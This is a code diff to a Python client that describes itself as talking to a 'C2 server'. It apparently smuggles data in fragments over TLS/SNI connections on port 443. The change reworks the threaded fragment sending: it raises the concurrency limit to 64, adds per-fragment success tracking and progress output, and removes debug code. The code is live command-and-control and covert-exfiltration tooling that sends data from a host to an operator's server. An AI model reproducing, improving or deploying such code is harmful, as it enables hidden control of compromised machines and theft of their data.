@@ -63,7 +63,7 @@ MAX_RETRIES = 5  # Max num of times we will retry sending a message before givin
 VERBOSE = True
 CLIENT_MODE = "sni"
 THREADS = 1
-MAX_THREADS = 32
+MAX_THREADS = 64
 
 
 class Session:
@@ -303,77 +303,44 @@ class Session:
 
         # TODO: We have our fragments now, send them asyncronously
         threads = []
-        threads_running = 0
-        threads_joined = 0
         thread_results = []
+        thread_results_bool = []
         bytes_sent = 0
         self._thread_slots_available = 0
         self._thread_fragments_sent = 0
-        total_fragments = len(fragments)
-        # TODO !!! We need to implement MAX_THREADS !!!
-
-        def _thread_watcher(threads: list, threads_joined: int, available_slots: int, total_threads: int) -> None:
-            while True:
-                if threads_joined == total_threads:
-                    return
-                print(f"! DEBUG: in thread_watcher.. threads LEN={len(threads)}")
-                for idx, thread in enumerate(threads):
-                    # print(f"! DEBUG THREAD:          thread {idx} is_alive={thread.is_alive()}")
-                    if thread.is_alive():
-                        thread.join()
-                        print(f"! DEBUG:           Thread joined!")
-                    threads_joined += 1
-                    available_slots += 1
-                print(
-                    f"! DEBUG _thread_watcher(): threads_joined={threads_joined}, total_threads={total_threads}, available_slots={available_slots}"
-                )
-                time.sleep(2)
-
         self._thread_slots_available = MAX_THREADS
-        # self.__fragments_sent_successfully = 0
-        # thread_watcher = threading.Thread(
-        #     target=_thread_watcher, args=(threads, threads_joined, self._thread_slots_available, total_fragments)
-        # )
-        # thread_watcher.start()
-        # print(f"! DEBUG: Thread watcher start")
         threads_started = 0
 
         for idx, fragment in enumerate(fragments):
-            # For each fragment, hand it off to a thread
-
             while True:
                 # print(
                 #     f"!!      DEBUG 1: len(fragments)={len(fragments)}, current_fragment_idx={idx}, available_slots={self._thread_slots_available}, threads_started={threads_started}"
                 # )
                 if self._thread_slots_available > 0:
                     thread_results.insert(idx, b"_EMPTY_")
-                    thread = threading.Thread(target=self._async_send, args=(fragment, thread_results, idx))
+                    thread = threading.Thread(
+                        target=self._async_send, args=(fragment, thread_results, idx, thread_results_bool)
+                    )
                     thread.start()
                     threads_started += 1
                     bytes_sent += len(fragment)
+                    sys.stdout.write("\033[K")
+                    print(f"    Sending {bytes_sent} bytes...", end="\r")
+                    sys.stdout.flush()
                     break
                 else:
                     time.sleep(1)
 
         if VERBOSE:
-            print(f"[+] Submitted {bytes_sent} bytes to {threads_started} threads ({MAX_THREADS} concurrent threads)")
-        # Now check our results
-
-        # Wait for threads to complete...
+            print(
+                f"[+] Submitted {bytes_sent} bytes to {threads_started} fragments in ({MAX_THREADS} concurrent threads)"
+            )
+        # Now check our results and Wait for threads to complete...
         while self._thread_fragments_sent < threads_started:
             time.sleep(1)
-
-        # for idx, thread in enumerate(thread_results):
-        #     print(
-        #         f"!!      DEBUG 2: RESULTS: result_idx={idx}, len(thread_results[idx])={len(thread)}, type(thread_results[idx])={type(thread)}, bytes={thread[:40]}"
-        #     )
-
-        # if not was_send_successful:
-        #     self.result_msg = "Sending of message failed - One or more fragments failed to send" + str(msg_type)
-        #     return False
-
-        # TODO: short circuit for now
-        # exit(1)
+        for idx, thread_result in enumerate(thread_results_bool):
+            if not thread_result:
+                print(f"[!] Error Sending Fragment {idx}, Got {thread_results[idx]}")
 
         # Now send our Final response msg, telling the server we are done sending
         smuggle.header = self.client_id + ClientMessage.RESPONSE
@@ -684,13 +651,14 @@ class Session:
         self.rtt = int((int(time.time_ns()) - start) / NS_TO_MS)
         return response_data
 
-    def _async_send(self, fragment, results, result_index) -> None:
+    def _async_send(self, fragment, results, result_index, thread_results_bool) -> None:
         """
         Sends a msg to the C2 server ASYNCH
         Remember that our overall TCP/TLS connection is STATELESS
         We are wrapping this stateless protocol in our own stateful one.
         Therefore, every single REQUEST/RESPONSE is stateless to the outside protocol
         """
+        thread_results_bool[result_index] = False
         self._thread_slots_available -= 1
         response_bytes = b"_SEND_FAILURE_IDX=" + str(result_index).encode()
         results.insert(result_index, response_bytes)
@@ -738,7 +706,6 @@ class Session:
             is_connected = True
         else:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
             port = 443
             try:
                 port = self.server.split(":")[1]
@@ -764,6 +731,7 @@ class Session:
             return _submit_error("NOT CONNECTED!")
         self._thread_slots_available += 1
         self._thread_fragments_sent += 1
+        thread_results_bool[result_index] = True
         return
 
     def _parse_server_hello(self, response_bytes: bytes) -> bytes:
@@ -977,6 +945,10 @@ if __name__ == "__main__":
             CLIENT_MODE = "seed"
     if args.threads:
         THREADS = int(args.threads)
+        if THREADS < 2:
+            THREADS = 2
+        if THREADS > MAX_THREADS:
+            THREADS = MAX_THREADS
     proxy = None
     proxy_hostname = proxy_scheme = ""
     proxy_port = 0
